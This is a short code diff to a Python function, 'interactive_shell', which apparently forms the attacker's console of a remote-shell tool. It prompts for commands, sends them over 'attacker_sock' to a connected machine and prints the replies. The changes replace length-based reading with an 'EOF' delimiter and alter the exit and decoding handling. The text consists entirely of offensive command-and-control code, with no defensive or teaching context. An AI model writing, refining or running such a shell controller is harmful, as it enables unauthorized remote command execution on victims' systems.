@@ -24,18 +24,19 @@ def interactive_shell(attacker_sock, LINE_LEN):
     try:
         while True:
             cmd = input("Shell> ")
-            if cmd.lower() in ['exit', 'quit']:
+            if cmd.lower() in ['exit']:
                 break
             attacker_sock.sendall(cmd.encode('utf-8'))
 
-            response = b""
+            response = b''
             while True:
                 chunk = attacker_sock.recv(LINE_LEN)
-                response += chunk
-                if len(chunk) < LINE_LEN:
+                if b'EOF' in chunk:
+                    response += chunk.replace(b'EOF', b'')
                     break
+                response += chunk
 
-            print(response.decode('utf-8', errors='ignore'))    
+            print(response.decode('utf-8'))  
     except KeyboardInterrupt:
         print("\nExiting Shell.")
     finally:
